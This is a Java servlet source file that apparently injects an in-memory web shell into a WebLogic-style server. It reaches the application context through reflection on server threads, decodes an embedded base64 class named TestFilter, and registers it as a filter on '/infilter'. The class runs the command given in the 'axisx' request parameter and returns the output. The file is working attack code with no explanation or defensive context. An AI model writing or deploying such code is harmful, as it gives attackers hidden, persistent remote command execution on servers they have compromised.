package com.axisx;

import sun.misc.BASE64Decoder;

import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.lang.reflect.Array;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.util.Map;

public class InjectFilterByServlet extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            Object context=getContext();
            // 名为TestFilter，接收参数为axisx
            String FilterBase64 = "yv66vgAAADQAvwoAJABwBwBxCgAjAHIIAHMLAAIAdAoAIwB1CwAgAHYKAHcAeAcAeQoAegB7CgB6AHwKAH0AfgcAfwoADQCABwCBCgAPAIIHAIMKABEAcAoADwCEBwCFCgAUAHAKABQAhggAhwoAFACICgARAIkKABEAiAoAJACKCACLCgCMAI0KAI4AjwoAjgCQBwCRCgCMAJIIAJMHAJQHAJUHAJYBAAY8aW5pdD4BAAMoKVYBAARDb2RlAQAPTGluZU51bWJlclRhYmxlAQASTG9jYWxWYXJpYWJsZVRhYmxlAQAEdGhpcwEADExUZXN0RmlsdGVyOwEABGluaXQBAB8oTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOylWAQAMZmlsdGVyQ29uZmlnAQAcTGphdmF4L3NlcnZsZXQvRmlsdGVyQ29uZmlnOwEACkV4Y2VwdGlvbnMHAJcBAAhkb0ZpbHRlcgEAWyhMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVxdWVzdDtMamF2YXgvc2VydmxldC9TZXJ2bGV0UmVzcG9uc2U7TGphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW47KVYBAAZyZXN1bHQBABJMamF2YS9sYW5nL1N0cmluZzsBAA5zZXJ2bGV0UmVxdWVzdAEAHkxqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXF1ZXN0OwEAD3NlcnZsZXRSZXNwb25zZQEAH0xqYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZTsBAAtmaWx0ZXJDaGFpbgEAG0xqYXZheC9zZXJ2bGV0L0ZpbHRlckNoYWluOwEAA3JlcQEAJ0xqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXF1ZXN0OwEABHJlc3ABAChMamF2YXgvc2VydmxldC9odHRwL0h0dHBTZXJ2bGV0UmVzcG9uc2U7AQADY21kAQANU3RhY2tNYXBUYWJsZQcAlAcAmAcAmQcAmgcAcQcAkQcAmwcAeQcAnAEAB2Rlc3Ryb3kBAAtDb21tYW5kRXhlYwEAJihMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9TdHJpbmc7AQACcnQBABNMamF2YS9sYW5nL1J1bnRpbWU7AQAEcHJvYwEAE0xqYXZhL2xhbmcvUHJvY2VzczsBAAZzdGRlcnIBABVMamF2YS9pby9JbnB1dFN0cmVhbTsBAANpc3IBABtMamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcjsBAAJicgEAGExqYXZhL2lvL0J1ZmZlcmVkUmVhZGVyOwEABGxpbmUBAAJzYgEAGExqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwcAnQcAngcAnwcAfwcAgQcAgwEAFmdldFJlc3BvbnNlRnJvbVJlcXVlc3QBAFEoTGphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3Q7KUxqYXZheC9zZXJ2bGV0L2h0dHAvSHR0cFNlcnZsZXRSZXNwb25zZTsBAAR2YXIzAQAZTGphdmEvbGFuZy9yZWZsZWN0L0ZpZWxkOwEABHZhcjQBAAR2YXI1AQASTGphdmEvbGFuZy9PYmplY3Q7AQAEdmFyNgEABHZhcjgBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAR2YXIxAQAEdmFyMgEAClNvdXJjZUZpbGUBAA9UZXN0RmlsdGVyLmphdmEMACYAJwEAJWphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlcXVlc3QMAGIAYwEABWF4aXN4DACgAE4MAE0ATgwAoQCiBwCjDACkAKUBABNqYXZhL2xhbmcvRXhjZXB0aW9uBwCdDACmAKcMAKgAqQcAngwAqgCrAQAZamF2YS9pby9JbnB1dFN0cmVhbVJlYWRlcgwAJgCsAQAWamF2YS9pby9CdWZmZXJlZFJlYWRlcgwAJgCtAQAWamF2YS9sYW5nL1N0cmluZ0J1ZmZlcgwArgCvAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMALAAsQEAAQoMALIArwwAsACzDAC0ALUBAAhyZXNwb25zZQcAtgwAtwC4BwC5DAC6ALsMALwAvQEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlDAC+ALUBAAdyZXF1ZXN0AQAKVGVzdEZpbHRlcgEAEGphdmEvbGFuZy9PYmplY3QBABRqYXZheC9zZXJ2bGV0L0ZpbHRlcgEAHmphdmF4L3NlcnZsZXQvU2VydmxldEV4Y2VwdGlvbgEAHGphdmF4L3NlcnZsZXQvU2VydmxldFJlcXVlc3QBAB1qYXZheC9zZXJ2bGV0L1NlcnZsZXRSZXNwb25zZQEAGWphdmF4L3NlcnZsZXQvRmlsdGVyQ2hhaW4BABBqYXZhL2xhbmcvU3RyaW5nAQATamF2YS9pby9JT0V4Y2VwdGlvbgEAEWphdmEvbGFuZy9SdW50aW1lAQARamF2YS9sYW5nL1Byb2Nlc3MBABNqYXZhL2lvL0lucHV0U3RyZWFtAQAMZ2V0UGFyYW1ldGVyAQAJZ2V0V3JpdGVyAQAXKClMamF2YS9pby9QcmludFdyaXRlcjsBABNqYXZhL2lvL1ByaW50V3JpdGVyAQAHcHJpbnRsbgEAFShMamF2YS9sYW5nL1N0cmluZzspVgEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQAOZ2V0SW5wdXRTdHJlYW0BABcoKUxqYXZhL2lvL0lucHV0U3RyZWFtOwEAGChMamF2YS9pby9JbnB1dFN0cmVhbTspVgEAEyhMamF2YS9pby9SZWFkZXI7KVYBAAhyZWFkTGluZQEAFCgpTGphdmEvbGFuZy9TdHJpbmc7AQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBACwoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvU3RyaW5nQnVmZmVyOwEACGdldENsYXNzAQATKClMamF2YS9sYW5nL0NsYXNzOwEAD2phdmEvbGFuZy9DbGFzcwEAEGdldERlY2xhcmVkRmllbGQBAC0oTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEADXNldEFjY2Vzc2libGUBAAQoWilWAQADZ2V0AQAmKExqYXZhL2xhbmcvT2JqZWN0OylMamF2YS9sYW5nL09iamVjdDsBAA1nZXRTdXBlcmNsYXNzACEAIwAkAAEAJQAAAAYAAQAmACcAAQAoAAAALwABAAEAAAAFKrcAAbEAAAACACkAAAAGAAEAAAAKACoAAAAMAAEAAAAFACsALAAAAAEALQAuAAIAKAAAADUAAAACAAAAAbEAAAACACkAAAAGAAEAAAANACoAAAAWAAIAAAABACsALAAAAAAAAQAvADAAAQAxAAAABAABADIAAQAzADQAAgAoAAAA7wACAAgAAAAzK8AAAjoEKhkEtgADOgUZBBIEuQAFAgA6BioZBrYABjoHGQW5AAcBABkHtgAIpwAFOgexAAEAGQAtADAACQADACkAAAAiAAgAAAARAAYAEgAOABMAGQAVACEAFgAtABkAMAAXADIAGwAqAAAAUgAIACEADAA1ADYABwAAADMAKwAsAAAAAAAzADcAOAABAAAAMwA5ADoAAgAAADMAOwA8AAMABgAtAD0APgAEAA4AJQA/AEAABQAZABoAQQA2AAYAQgAAACIAAv8AMAAHBwBDBwBEBwBFBwBGBwBHBwBIBwBJAAEHAEoBADEAAAAIAAMASwAyAEsAAQBMACcAAQAoAAAAKwAAAAEAAAABsQAAAAIAKQAAAAYAAQAAAB8AKgAAAAwAAQAAAAEAKwAsAAAAAQBNAE4AAgAoAAABKQADAAkAAABguAAKTSwrtgALTi22AAw6BLsADVkZBLcADjoFuwAPWRkFtwAQOgYBOge7ABFZtwASOggZBrYAE1k6B8YAIBkIuwAUWbcAFRkHtgAWEhe2ABa2ABi2ABlXp//bGQi2ABqwAAAAAwApAAAAKgAKAAAAIgAEACMACgAkABAAJQAbACYAJgAnACkAKAAyACkAPQAqAFoALAAqAAAAXAAJAAAAYAArACwAAAAAAGAAQQA2AAEABABcAE8AUAACAAoAVgBRAFIAAwAQAFAAUwBUAAQAGwBFAFUAVgAFACYAOgBXAFgABgApADcAWQA2AAcAMgAuAFoAWwAIAEIAAAAlAAL/ADIACQcAQwcASQcAXAcAXQcAXgcAXwcAYAcASQcAYQAAJwAxAAAABAABAAkAIQBiAGMAAQAoAAABTQACAAcAAABhAU0rtgAbEhy2AB1OLQS2AB4tK7YAH8AAIE2nAEVOK7YAG7YAIbYAIRIitgAdOgQZBAS2AB4ZBCu2AB86BRkFtgAbEhy2AB06BhkGBLYAHhkGGQW2AB/AACBNpwAFOgQssAACAAIAGgAdAAkAHgBaAF0ACQADACkAAAA+AA8AAAAwAAIAMwAMADQAEQA1ABoAQAAdADYAHgA4AC8AOQA1ADoAPQA7AEkAPABPAD0AWgA/AF0APgBfAEIAKgAAAFIACAAMAA4AZABlAAMALwArAGYAZQAEAD0AHQBnAGgABQBJABEAaQBlAAYAHgBBAGoAawADAAAAYQArACwAAAAAAGEAbAA+AAEAAgBfAG0AQAACAEIAAAAuAAP/AB0AAwcAQwcARwcASAABBwBK/wA/AAQHAEMHAEcHAEgHAEoAAQcASvoAAQABAG4AAAACAG8=";
            byte[] FilterClass = new BASE64Decoder().decodeBuffer(FilterBase64);
            Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
            defineClass.setAccessible(true);

            Field f5 = context.getClass().getDeclaredField("classLoader");
            f5.setAccessible(true);
            Object o5 = f5.get(context);

            Class filter_class = (Class) defineClass.invoke(o5, FilterClass, 0, FilterClass.length);

            Field f6 = o5.getClass().getDeclaredField("cachedClasses");
            f6.setAccessible(true);
            Object o6 = f6.get(o5);

            Method m1 = o6.getClass().getDeclaredMethod("get", Object.class);
            m1.setAccessible(true);
            if (m1.invoke(o6, "TestFilter") == null) {
                Method put = o6.getClass().getMethod("put", Object.class, Object.class);
                put.setAccessible(true);
                put.invoke(o6, "TestFilter", filter_class);
                Field f7 = context.getClass().getDeclaredField("filterManager");
                f7.setAccessible(true);
                Object o7 = f7.get(context);
                Method registerFilter = o7.getClass().getDeclaredMethod("registerFilter", String.class, String.class, String[].class, String[].class, Map.class, String[].class);
                registerFilter.setAccessible(true);
                registerFilter.invoke(o7, "TestFilter", "TestFilter", new String[]{"/infilter"}, null, null, null);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static synchronized Object getContext() throws NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        ThreadGroup threadGroup=Thread.currentThread().getThreadGroup();
        Field field=threadGroup.getClass().getDeclaredField("threads");
        field.setAccessible(true);
        Thread[] threads=(Thread[])field.get(threadGroup);
        for (Thread thread : threads) {
            if (thread.getName().contains("ACTIVE")) {
                Field f1 = thread.getClass().getDeclaredField("workEntry");
                f1.setAccessible(true);
                Object o1 = f1.get(thread);

                Field f2 = o1.getClass().getDeclaredField("connectionHandler");
                f2.setAccessible(true);
                Object o2 = f2.get(o1);

                Field f3 = o2.getClass().getDeclaredField("request");
                f3.setAccessible(true);
                Object o3 = f3.get(o2);

                Field f4 = o3.getClass().getDeclaredField("context");
                f4.setAccessible(true);
                Object o4 = f4.get(o3);
                return o4;
            }
        }
        return null;
    }

}
